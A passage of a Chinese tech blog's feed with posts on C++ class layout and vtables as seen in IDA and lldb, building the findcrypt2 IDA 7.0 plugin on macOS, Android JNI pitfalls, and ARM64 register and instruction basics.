    <content type="html"><![CDATA[<h3 id="C-类结构以及vtable分析"><a href="#C-类结构以及vtable分析" class="headerlink" title="C++类结构以及vtable分析"></a>C++类结构以及vtable分析</h3><blockquote><p>通过实验自己对一些C++数据结构的理解</p></blockquote><h3 id="实验一"><a href="#实验一" class="headerlink" title="实验一"></a>实验一</h3><pre><code class="c++">#include &lt;iostream&gt;using namespace std;// 基类class Shape {   public:      void setWidth(int w)      {         width = w;      }      void setHeight(int h)      {         height = h;      }   protected:      int width;      int height;};// 派生类class Rectangle: public Shape{   public:      int getArea()      {          return (width * height);       }};int main(void){   Rectangle Rect;   Rect.setWidth(5);   Rect.setHeight(7);   // 输出对象的面积   cout &lt;&lt; &quot;Total area: &quot; &lt;&lt; Rect.getArea() &lt;&lt; endl;   return 0;}</code></pre><p>上面的代码编译完成后，在ida中反汇编如下</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp){  __int64 v3; // ST08_8  unsigned int v4; // eax  char v6; // [rsp+10h] [rbp-20h]  int v7; // [rsp+1Ch] [rbp-14h]  __int64 (__fastcall *v8)(_QWORD); // [rsp+20h] [rbp-10h]  __int64 v9; // [rsp+28h] [rbp-8h]  v7 = 0;  Shape::setWidth((Shape *)&amp;v6, 5);  Shape::setHeight((Shape *)&amp;v6, 7);  v3 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total area: &quot;);  v4 = Rectangle::getArea((Rectangle *)&amp;v6);  v9 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v3, v4);  v8 = std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;;  std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v9);  return 0;}</code></pre><p>Rect内存布局</p><pre><code>(lldb) x/20b $rbp-0x200x7ffeefbff560: 0x05 0x00 0x00 0x00 0x07 0x00 0x00 0x000x7ffeefbff568: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00</code></pre><p>能得到的结论是，在编译完后，子类Rectangle的方法调用都编译成父类Shape方法调用，这是在编译时就决定了的。把子类对象和参数合并作为参数传入父类方法。这里仅仅是对子类对象另个偏移值做操作。</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp){  void *v3; // ST10_8  __int64 v4; // ST08_8  unsigned int v5; // eax  __int64 v6; // ST38_8  v3 = (void *)operator new(8uLL);  memset(v3, 0, 8uLL);  Shape::setWidth((Shape *)v3, 5);  Shape::setHeight((Shape *)v3, 7);  v4 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total area: &quot;);  v5 = Rectangle::getArea((Rectangle *)v3);  v6 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v4, v5);  std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v6);  return 0;}</code></pre><p>这里将 Rectangle Rect改为Rectangle *Rect = new Rectangle()在堆上申请内存可以看出，在类初始化的时候，仅仅申请了一块8字节空间，正好是两个int的大小，仅此而已。</p><h3 id="实验二"><a href="#实验二" class="headerlink" title="实验二"></a>实验二</h3><pre><code class="c++">#include &lt;iostream&gt;using namespace std;// 基类class Shape {public:   // 提供接口框架的纯虚函数   virtual int getArea() = 0;   void setWidth(int w)   {      width = w;   }   void setHeight(int h)   {      height = h;   }protected:   int width;   int height;};// 派生类class Rectangle: public Shape{public:   int getArea()   {       return (width * height);    }};class Triangle: public Shape{public:   int getArea()   {       return (width * height)/2;    }};int main(void){   Rectangle Rect;   Triangle  Tri;   Rect.setWidth(5);   Rect.setHeight(7);   // 输出对象的面积   cout &lt;&lt; &quot;Total Rectangle area: &quot; &lt;&lt; Rect.getArea() &lt;&lt; endl;   Tri.setWidth(5);   Tri.setHeight(7);   // 输出对象的面积   cout &lt;&lt; &quot;Total Triangle area: &quot; &lt;&lt; Tri.getArea() &lt;&lt; endl;    return 0;}</code></pre><p>上面的代码编译完成后，在ida中反汇编如下</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp){  __int64 v3; // ST20_8  unsigned int v4; // eax  __int64 v5; // ST10_8  unsigned int v6; // eax  char v8; // [rsp+28h] [rbp-48h]  char v9; // [rsp+38h] [rbp-38h]  int v10; // [rsp+4Ch] [rbp-24h]  __int64 (__fastcall *v11)(_QWORD); // [rsp+50h] [rbp-20h]  __int64 v12; // [rsp+58h] [rbp-18h]  __int64 (__fastcall *v13)(_QWORD); // [rsp+60h] [rbp-10h]  __int64 v14; // [rsp+68h] [rbp-8h]  v10 = 0;  Rectangle::Rectangle((Rectangle *)&amp;v9);  Triangle::Triangle((Triangle *)&amp;v8);  Shape::setWidth((Shape *)&amp;v9, 5);  Shape::setHeight((Shape *)&amp;v9, 7);  v3 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total Rectangle area: &quot;);  v4 = Rectangle::getArea((Rectangle *)&amp;v9);  v12 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v3, v4);  v11 = std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;;  std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v12);  Shape::setWidth((Shape *)&amp;v8, 5);  Shape::setHeight((Shape *)&amp;v8, 7);  v5 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total Triangle area: &quot;);  v6 = Triangle::getArea((Triangle *)&amp;v8);  v14 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v5, v6);  v13 = std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;;  std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v14);  return 0;}</code></pre><p>这里与实验一明显不同在于，在初始化一个对象的时候会调用其构建方法。其反汇编代码如下</p><pre><code class="c++">__int64 *__fastcall Rectangle::Rectangle(Rectangle *this){  __int64 *result; // rax  Shape::Shape(this);  result = &amp;`vtable for&#39;Rectangle + 2;  *(_QWORD *)this = &amp;`vtable for&#39;Rectangle + 2;  return result;}</code></pre><p>这里发现里面还调用了父类的构建方法，父类构建方法反汇编代码如下</p><pre><code class="c++">__int64 *__fastcall Shape::Shape(Shape *this){  __int64 *result; // rax  result = &amp;`vtable for&#39;Shape + 2;  *(_QWORD *)this = &amp;`vtable for&#39;Shape + 2;  return result;}</code></pre><p>其实这两个构建方法就是对传入对象this指针赋值操作，在经过Shape::Shape(this)后其实this指针的64字节大小值为父类Shape的虚函数表地址。然后又被重新赋值为Rectangle自己的虚函数表地址。</p><p>这里的虚函数表地址，本质就是_DATA段的一个数据结构。</p><p>Rect的内存布局为</p><pre><code>(lldb) x/20b $rbp-0x380x7ffeefbff548: 0x20 0x21 0x00 0x00 0x01 0x00 0x00 0x000x7ffeefbff550: 0x05 0x00 0x00 0x00 0x07 0x00 0x00 0x00</code></pre><p>这里可以看到前64字节为虚函数表地址，后面两个32字节分别是其width和height</p><p>去ida中查看该地址</p><pre><code class="c++">__data:0000000100002110 ; `vtable for&#39;Rectangle__data:0000000100002110 __ZTV9Rectangle dq 0                    ; DATA XREF: __got:__ZTV9Rectangle_ptr↑o__data:0000000100002110                                         ; offset to this__data:0000000100002118                 dq offset __ZTI9Rectangle ; `typeinfo for&#39;Rectangle__data:0000000100002120                 dq offset __ZN9Rectangle7getAreaEv ; Rectangle::getArea(void)</code></pre><p>就是_DATA段中的数据结构，现在我们可以清晰的理解C++类在内存的数据结构了。</p><h3 id="一点理解"><a href="#一点理解" class="headerlink" title="一点理解"></a>一点理解</h3><p>C++这个语言特性非常多，如果不能理解其本质很容易造成bug。这里想把C++和OC做一个简单的对比，C++的很多实现都是在编译时就确定的，C++中的类我更愿意理解成为C中的结构体。而OC这语言，大多都是在运行时才能确定，方法转化为消息处理。在可执行文件中也有专门的段存储其复杂的类数据结构，也因为这样，OC在运行时可以做很多hack操作，比如hook其方法实现等等。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;C-类结构以及vtable分析&quot;&gt;&lt;a href=&quot;#C-类结构以及vtable分析&quot; class=&quot;headerlink&quot; title=&quot;C++类结构以及vtable分析&quot;&gt;&lt;/a&gt;C++类结构以及vtable分析&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;通过实
      
    
    </summary>
    
      <category term="C++" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/C/"/>
    
    
      <category term="C++" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>IDA7.0 Mac 插件编译指南v1</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/11/30/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/11/30/IDA-Mac-插件编写指南/IDA-Mac-插件编写指南/</id>
    <published>2017-11-30T06:25:09.000Z</published>
    <updated>2019-02-21T09:59:22.403Z</updated>
    
    <content type="html"><![CDATA[<h3 id="先说两句"><a href="#先说两句" class="headerlink" title="先说两句"></a>先说两句</h3><p>前不久IDA7.0发布，这次相较之前来说有很多的改动，首先整个IDA是x86 64位架构，而之前却一直是i386 32位，因此插件同样为64位的dylib。不仅这样，SDK上某些接口也发生了改变，导致很多优秀的插件不得不重新改动源码，很多在IDA7上编译也存在问题。下面我将以IDA的官方插件findcrypt2来说明IDA7的插件编译细节。编译IDA插件是个麻烦事，主要在于网上相关的资料很少，唯一的几篇也是年代久远，Makefile里面很多编译参数都有变化，目前来说，没有一个完整的文章来介绍如何在Mac平台下编译IDA插件的指南。希望这边文章能够对有这需求的人有所帮助。</p><h3 id="搭建xcode环境"><a href="#搭建xcode环境" class="headerlink" title="搭建xcode环境"></a>搭建xcode环境</h3><p>在Mac上完全可以用xcode来帮助我们编译IDA插件，其实更常见的是用Makefile编译，但原理一样，所以这里就以xcode来介绍。</p><p>我们知道IDA的插件的文件格式为dylib动态库，因此在创建xcode项目时在Framework&amp;Libarry中选择Libarry</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/xcode_step_1.jpg?raw=true" alt="xcode_step_1"></p><p>然后再选择为Dynamic动态库，并导入C++标准库</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/xcode_step_2.jpg?raw=true" alt="xcode_step_2"></p><p>接下来项目中自动会生成两个文件。暂时不用管，我们把findcrypt2的源码放入该项目，最后如下图所示</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/project_1.jpg?raw=true" alt="project_1"></p><p>这时你的项目中像ida.hpp这类的头文件肯定会提示找不到，还需要进一步设置。</p><h3 id="Build-setting"><a href="#Build-setting" class="headerlink" title="Build setting"></a>Build setting</h3><p>这里我们将设置头文件和库的搜索路径等等。</p><p>首先设置目标架构为x86_64</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/arch_s.jpg?raw=true" alt="arch_s"></p><p>然后设置头文件和库的搜索路径，依据你IDA及sdk路径改成对应路径</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/search_s.jpg?raw=true" alt="search_s"></p><p>经过上面的设置，此时xcode应该能找到头文件了，这时还需要设置连接的静态库</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/link_s.jpg?raw=true" alt="link_s"></p><p>这里连接的库为-lida64，表示我们编译的是解析64位的插件，若要编译解析32位的插件，这里为-lida即可。</p><p>最后我们还需要设置编译参数</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/macros_s.jpg?raw=true" alt="macros_s"></p><p>其中<code>__EA64__</code>在编译64位插件时才有。</p><p>这时候build一下，如果一切顺利，应该就不会报错了。</p><h3 id="最后说两句"><a href="#最后说两句" class="headerlink" title="最后说两句"></a>最后说两句</h3><p>IDA7相以前版本而言，插件的后缀名统一为dylib格式，之前32位为pmc，64位为pmc64。这里将编译好的插件改为<strong>findcrypt264.dylib</strong>表示为64位插件，则对应的32位插件名为<strong>findcry.dylib</strong></p><p>下面测试下效果，我们打开IDA去解析一个含有md4加密的macho文件，运行插件测试能否识别出其中的加密算法。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/test.jpg?raw=true" alt="test"></p><p>上图我们可以看到这里成功找到一处md4加密，反汇编窗口中正是md4加密中用到的常量数组。我顺便为插件注册了<strong>Ctrl-Alt-z</strong>的快捷键，若没有快捷键，可以在插件的导航栏里点击对应的插件即可。</p><h3 id="完"><a href="#完" class="headerlink" title="完"></a>完</h3><p>附上该插件，完。</p><p><a href="https://raw.githubusercontent.com/4ch12dy/4ch12dy.github.io/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/findcrypt264.dylib" target="_blank" rel="external">findcrypt264.dylib_for_ida7_made_by_x1a0</a></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><p><a href="http://newsoft-tech.facebook.com/2014/05/setting-up-ida-sdk-65-on-mac-os-x-109.html" target="_blank" rel="external">http://newsoft-tech.facebook.com/2014/05/setting-up-ida-sdk-65-on-mac-os-x-109.html</a></p></li><li><p><a href="http://www.h4ck.org.cn/2014/09/mac-ida-pro-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97-v1-0/" target="_blank" rel="external">http://www.h4ck.org.cn/2014/09/mac-ida-pro-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97-v1-0/</a></p></li><li><p><a href="https://github.com/XVilka/htools/blob/master/codebreak/plugins/ida/Makefile">https://github.com/XVilka/htools/blob/master/codebreak/plugins/ida/Makefile</a></p><p>​</p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;先说两句&quot;&gt;&lt;a href=&quot;#先说两句&quot; class=&quot;headerlink&quot; title=&quot;先说两句&quot;&gt;&lt;/a&gt;先说两句&lt;/h3&gt;&lt;p&gt;前不久IDA7.0发布，这次相较之前来说有很多的改动，首先整个IDA是x86 64位架构，而之前却一直是i386 32位，因
      
    
    </summary>
    
      <category term="IDA" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/IDA/"/>
    
    
      <category term="ida" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/ida/"/>
    
  </entry>
  
  <entry>
    <title>Android JNI踩坑笔记</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/11/28/Android_JNI_%E6%8E%89%E5%9D%91%E7%AC%94%E8%AE%B0%20/JNI/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/11/28/Android_JNI_掉坑笔记 /JNI/</id>
    <published>2017-11-28T09:00:20.000Z</published>
    <updated>2017-11-29T03:29:43.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><blockquote><p>最近项目需要用到jni去实现一些功能，在原生层调用java层的过程中，踩了很多坑，这里做个记录，方便以后查阅，以及如果遇到一些错误，看看有没有这里的坑。</p></blockquote></blockquote><h3 id="坑1–jni方法签名分号问题"><a href="#坑1–jni方法签名分号问题" class="headerlink" title="坑1–jni方法签名分号问题"></a>坑1–jni方法签名分号问题</h3><p>这是一个很常见的问题，第一次写jni中方法签名的时候很容易遇到这个错误，比如下面这个签名</p><pre><code class="c++">jmethodID equals_id = env-&gt;GetMethodID(string_c, &quot;equals&quot;, &quot;(Ljava/lang/Object;)Z&quot;);</code></pre><p>切记当参数或者返回值不是基本类型的时候一定要在末尾加上分号。</p><pre><code class="c++">jmethodID iterator_id = env-&gt;GetMethodID(list_c,&quot;iterator&quot;,&quot;()Ljava/util/Iterator;&quot;);</code></pre><p>这类错误常见描述为方法找不到错误。如果遇到类方法找不到切记先检查方法签名是否正确。</p><h3 id="坑2–原生方法包含默认2个参数"><a href="#坑2–原生方法包含默认2个参数" class="headerlink" title="坑2–原生方法包含默认2个参数"></a>坑2–原生方法包含默认2个参数</h3><p>这个坑当然是对jni使用不熟练造成的，未了解其特性，所以对于初学者来说容易犯。看一个原生函数</p><pre><code class="c++">static jboolean nativeFunction(JNIEnv *env, jobject content, jobject someObj){...}</code></pre><p>第一个保留参数为<code>JNIEnv</code>虚拟机环境变量，第二个为调用该原生方法的java类对象即上下文。这里多说一句，第二个参数的上下文需根据该方法为静态方法还是实例方法，若为静态方法，则这里上下文为类引用；若为实例方法，则上下文为该类的对象引用。若把类引用当做对象引用，在查找方法id时则会出现方法找不到错误。</p><p>由于很多时候不声明这两个参数同样能正确运行（无其他参数时）导致忽略了第二个参数的存在，以为第二个上下文参数为传入的对象引用。</p><p>这类错误常见描述为当你在某处调用这个对象的方法时，会提示找不到该方法。因为这个对象根本不是你传入的对象。</p><h3 id="坑3—jni调用父类方法的正确姿势"><a href="#坑3—jni调用父类方法的正确姿势" class="headerlink" title="坑3—jni调用父类方法的正确姿势"></a>坑3—jni调用父类方法的正确姿势</h3><p>这里就以一个正确的调用父类方法的流程来讲，起因是当我在查找<code>Exception</code>这个类的<code>getStackTrace</code></p><p>方法时提示方法找不到错误，调了会才发现这个方法是在其父类<code>Throwable</code>中，所以正确的写法为：</p><pre><code class="c++">    jclass exception_c = env-&gt;FindClass(&quot;java/lang/Exception&quot;);    jclass throwable_c = env-&gt;FindClass(&quot;java/lang/Throwable&quot;);    jmethodID getStackTrace_id = env-&gt;GetMethodID(throwable_c, &quot;getStackTrace&quot;,&quot;()[Ljava/lang/StackTraceElement;&quot;);</code></pre><p>那么怎么调用呢？用<code>CallNonvirtual&lt;XXX&gt;Method</code>去调用父类中的方法，一个调用例子：</p><pre><code class="c++">jobjectArray stes = (jobjectArray)env-&gt;CallNonvirtualObjectMethod(excep, throwable_c, getStackTrace_id);</code></pre><p>这里需要传入三个参数，第一个为子类的对象引用，第二个为父类类引用，第三个为方法id。</p><h3 id="坑4—其他小坑"><a href="#坑4—其他小坑" class="headerlink" title="坑4—其他小坑"></a>坑4—其他小坑</h3><p>写jni代码时最大的麻烦在于要写很多代码去定位java中的类和方法，java中一个很简单的调用，在jni层写时或许要写很大一堆，这也不奇怪，因为没有了Android虚拟机，这些本来由虚拟机做的事必须得手动去完成。在写jni层代码时，还有一些小的错误，比如<code>jstring</code>与<code>char*</code>的转换，<code>LOGE()</code>函数中参数为<code>char*</code>的字符串。当然还有一些java与C语言类型对应的问题就不多说了，自己翻下<code>jni.h</code>头文件就能找到。</p><p>还有个AndroidStudio的bug在于不能正确的解析jni等头文件，虽然不影响编译，但没有了代码提示以及显示红色看着也挺难受的。网上找到一个解决办法，在对应的<code>build.gradle</code>文件中在<code>defaultConfig{}</code>加入下面的脚本：</p><pre><code class="c">        sourceSets.main{            jni.srcDirs  &#39;/Users/king/Android/sdk/ndk-bundle/platforms/android-19/arch-mips/usr/include&#39;            jniLibs.srcDir &#39;/Users/king/Android/sdk/ndk-bundle/platforms/android-19/arch-arm/usr/lib&#39;        }</code></pre><p>无非是手动指定了jni相关的文件路径。</p><p>关于下面两类写法：</p><pre><code class="c++">jclass exception_c = env-&gt;FindClass(&quot;java/lang/Exception&quot;);</code></pre><pre><code class="c">jclass exception_c = (*env)-&gt;FindClass(env, &quot;java/lang/Exception&quot;);</code></pre><p>原因在于C++和C的两种写法，可以在文件中宏定义为C++的即可。</p><h3 id="完"><a href="#完" class="headerlink" title="完"></a>完</h3><p>说了这些坑，当然我都踩过，由于刚接触Android jni特性。所以踩了很多坑，尤其是Android不像iOS那样容易debug，多了一层虚拟机导致很多错误不好调式。说到这，还要吐槽下AndroidStudio的gradle这个项目管理器，各种版本或者莫名奇怪的错误，虽然Xcode同样不是很好用，但相比之下，Xcode省心多了。</p><p>继续踩坑去了…</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;最近项目需要用到jni去实现一些功能，在原生层调用java层的过程中，踩了很多坑，这里做个记录，方便以后查阅，以及如果遇到一些错误，看看有没有这里的坑。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;h
      
    
    </summary>
    
    
      <category term="android" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>ARM64基础知识整理</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/10/21/ARM64%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/ARM64%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/10/21/ARM64基础知识整理/ARM64基础知识整理/</id>
    <published>2017-10-21T10:07:00.000Z</published>
    <updated>2019-03-02T04:33:04.894Z</updated>
    
    <content type="html"><![CDATA[<h3 id="ARM64基础知识整理"><a href="#ARM64基础知识整理" class="headerlink" title="ARM64基础知识整理"></a>ARM64基础知识整理</h3><h4 id="Register"><a href="#Register" class="headerlink" title="Register"></a>Register</h4><h5 id="参数寄存器-X0-X7"><a href="#参数寄存器-X0-X7" class="headerlink" title="参数寄存器 (X0-X7)"></a>参数寄存器 (X0-X7)</h5><p>参数寄存器，在函数调用的时候传参使用。X0-X7分别对应8个参数，多于8个的参数保存在栈中。</p><h5 id="其他特殊寄存器"><a href="#其他特殊寄存器" class="headerlink" title="其他特殊寄存器"></a>其他特殊寄存器</h5><table><thead><tr><th style="text-align:center">X29(FP)</th><th style="text-align:center">栈帧寄存器  类比x64中rbp</th></tr></thead><tbody><tr><td style="text-align:center">X30(LR)</td><td style="text-align:center">链接寄存器，保存函数返回地址，x64该地址保存在栈中</td></tr><tr><td style="text-align:center">SP</td><td style="text-align:center">栈顶寄存器，类比x64中</td></tr><tr><td style="text-align:center">PC</td><td style="text-align:center">指向下一条指令</td></tr><tr><td style="text-align:center">寄存器</td><td style="text-align:center">描述</td></tr><tr><td style="text-align:center">CPSR</td><td style="text-align:center">状态寄存器</td></tr></tbody></table><h4 id="Instructions"><a href="#Instructions" class="headerlink" title="Instructions"></a>Instructions</h4><ul><li><code>mov</code></li></ul><pre><code class="assembly">  mov x0, x1; copies x1 into x0  mov x1, 0x4141; loads the value 0x4141 in x1</code></pre><ul><li><code>str/ldr</code></li></ul><pre><code class="assembly">str x0, [x29]; store x0 at the address in x29ldr x0, [x29]; load the value from the address in x29 into x0</code></pre><ul><li><code>stp/ldp</code></li></ul><pre><code class="assembly">stp x29, x30, [sp]; store x29 at sp and x30 at sp+8</code></pre><ul><li><code>b/br</code></li></ul><pre><code class="assembly"> br x0; jump to the address stored in x0</code></pre><ul><li><code>ret</code></li></ul><pre><code>Unlike it’s x86 equivalent which pops the return address from stack, it looks for the return address in the x30 register and jumps there.</code></pre><h4 id="Indexing-modes"><a href="#Indexing-modes" class="headerlink" title="Indexing modes"></a>Indexing modes</h4><ul><li>Immediate offset : <code>[base, #offset]</code> - Index an offset directly and don’t mess with anything else</li></ul><pre><code class="assembly">ldr x0, [sp, 0x10]; load x0 from sp+0x10</code></pre><ul><li>Pre-indexed : <code>[base, #offset]!</code> - Almost the same as above, except that base+offset is written back into base.</li></ul><pre><code class="assembly">ldr x0, [sp, 0x10]!; load x0 from sp+0x10 and then increase sp by 0x10</code></pre><ul><li>Post-indexed : <code>[base], #offset</code> - Use the base directly and then write base+offset back into the base</li></ul><pre><code class="assembly">ldr x0, [sp], 0x10; load x0 from sp and then increase sp by 0x10</code></pre><h4 id="函数调用demo分析"><a href="#函数调用demo分析" class="headerlink" title="函数调用demo分析"></a>函数调用demo分析</h4><pre><code class="assembly">__text:000000010004F0D4                 SUB             SP, SP, #0x70__text:000000010004F0D8                 STP             X24, X23, [SP,#0x60+var_30]__text:000000010004F0DC                 STP             X22, X21, [SP,#0x60+var_20]__text:000000010004F0E0                 STP             X20, X19, [SP,#0x60+var_10]__text:000000010004F0E4                 STP             X29, X30, [SP,#0x60+var_s0]__text:000000010004F0E8                 ADD             X29, SP, #0x60__text:000000010004F0EC                 MOV             X19, X0__text:000000010004F0F0                 ADRP            X8, #___stack_chk_guard_ptr@PAGE__text:000000010004F0F4                 LDR             X8, [X8,#___stack_chk_guard_ptr@PAGEOFF]__text:000000010004F0F8                 LDR             X8, [X8]__text:000000010004F0FC                 STR             X8, [SP,#0x60+var_38]__text:000000010004F100                 ADRP            X8, #classRef_Fabric@PAGE__text:000000010004F104                 LDR             X20, [X8,#classRef_Fabric@PAGEOFF]__text:000000010004F108                 NOP__text:000000010004F10C                 LDR             X0, [X8,#classRef_Crashlytics@PAGEOFF] ; void *__text:000000010004F110                 ADRP            X8, #selRef_class@PAGE__text:000000010004F114                 LDR             X1, [X8,#selRef_class@PAGEOFF] ; char *__text:000000010004F118                 BL              _objc_msgSend...__text:000000010004F2F4                 LDP             X29, X30, [SP,#0x60+var_s0]__text:000000010004F2F8                 LDP             X20, X19, [SP,#0x60+var_10]__text:000000010004F2FC                 LDP             X22, X21, [SP,#0x60+var_20]__text:000000010004F300                 LDP             X24, X23, [SP,#0x60+var_30]__text:000000010004F304                 ADD             SP, SP, #0x70__text:000000010004F308                 RET</code></pre><table><thead><tr><th style="text-align:center">地址</th><th style="text-align:center">栈值</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">sp=sp-0x70</td><td style="text-align:center"></td><td style="text-align:center">局部变量空间</td></tr><tr><td style="text-align:center">sp-0x60</td><td style="text-align:center"></td><td style="text-align:center">局部变量空间</td></tr><tr><td style="text-align:center">sp-0x50</td><td style="text-align:center"></td><td style="text-align:center">局部变量空间</td></tr><tr><td style="text-align:center">sp-0x40</td><td style="text-align:center">X24/X23</td><td style="text-align:center">保存寄存器信息</td></tr><tr><td style="text-align:center">sp-0x30</td><td style="text-align:center">X22/X21</td><td style="text-align:center">保存寄存器信息</td></tr><tr><td style="text-align:center">sp-0x20</td><td style="text-align:center">X20/X19</td><td style="text-align:center">保存寄存器信息</td></tr><tr><td style="text-align:center">X29 –&gt; sp-0x10</td><td style="text-align:center">X29/X30</td><td style="text-align:center">保存前栈基址和返回地址</td></tr><tr><td style="text-align:center">sp=sp</td><td style="text-align:center"></td><td style="text-align:center">调用前的栈顶地址</td></tr></tbody></table><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://www.jianshu.com/p/2f4a5f74ac7a" target="_blank" rel="external">https://www.jianshu.com/p/2f4a5f74ac7a</a></li><li><a href="https://wiki.cdot.senecacollege.ca/wiki/Aarch64_Register_and_Instruction_Quick_Start" target="_blank" rel="external">https://wiki.cdot.senecacollege.ca/wiki/Aarch64_Register_and_Instruction_Quick_Start</a></li><li><a href="https://blog.perfect.blue/ROPing-on-Aarch64" target="_blank" rel="external">https://blog.perfect.blue/ROPing-on-Aarch64</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;ARM64基础知识整理&quot;&gt;&lt;a href=&quot;#ARM64基础知识整理&quot; class=&quot;headerlink&quot; title=&quot;ARM64基础知识整理&quot;&gt;&lt;/a&gt;ARM64基础知识整理&lt;/h3&gt;&lt;h4 id=&quot;Register&quot;&gt;&lt;a href=&quot;#Register&quot;
      
    
    </summary>
    
      <category term="assembly" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/assembly/"/>
    
    
      <category term="ARM64" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/ARM64/"/>
    
  </entry>
  
  <entry>
    <title>X86指令编码笔记</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/10/11/x86%E6%8C%87%E4%BB%A4%E7%BC%96%E7%A0%81%E7%AC%94%E8%AE%B0/X86%E6%8C%87%E4%BB%A4%E7%BC%96%E7%A0%81%E7%AC%94%E8%AE%B0/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/10/11/x86指令编码笔记/X86指令编码笔记/</id>
    <published>2017-10-11T03:46:13.000Z</published>
    <updated>2019-02-21T10:03:24.082Z</updated>
    
